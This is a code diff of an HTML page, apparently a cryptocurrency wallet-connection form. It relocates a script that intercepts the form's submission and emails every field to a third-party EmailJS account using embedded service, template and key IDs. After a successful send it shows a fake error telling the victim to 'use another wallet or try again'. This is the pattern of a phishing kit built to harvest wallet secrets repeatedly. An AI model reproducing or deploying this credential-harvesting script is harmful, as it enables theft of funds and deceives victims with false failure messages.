@@ -136,6 +136,37 @@
                               <path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                             </svg></span></button></div>
                                         </div>
+
+                                    </form>
+                                        <script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('SphkKEUkKpPqrfBcy')
+</script>
+
+<script>
+    const btn = document.getElementById('submit');
+
+document.getElementById('my-form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'service_zpoc9tn';
+   const templateID = 'template_dpkh9dd';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('An error occurred !!! User another wallet or Try Again.');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
+</script>
                                         <div id="second" class="acc-body bg-grey-600">
                                             <div class="flex flex-col">
 
@@ -181,35 +212,7 @@
                                         </div>
                                     </form>
 
-                                        <script type="text/javascript"
-  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-
-<script type="text/javascript">
-  emailjs.init('SphkKEUkKpPqrfBcy')
-</script>
-
-<script>
-    const btn = document.getElementById('submit');
-
-document.getElementById('my-form')
- .addEventListener('submit', function(event) {
-   event.preventDefault();
-
-   btn.value = 'Sending...';
-
-   const serviceID = 'service_zpoc9tn';
-   const templateID = 'template_dpkh9dd';
-
-   emailjs.sendForm(serviceID, templateID, this)
-    .then(() => {
-      btn.value = 'Send Email';
-      alert('An error occurred !!! User another wallet or Try Again.');
-    }, (err) => {
-      btn.value = 'Send Email';
-      alert(JSON.stringify(err));
-    });
-});
-</script>
+                                       
                                 </div>
                             </div>
                         </div>
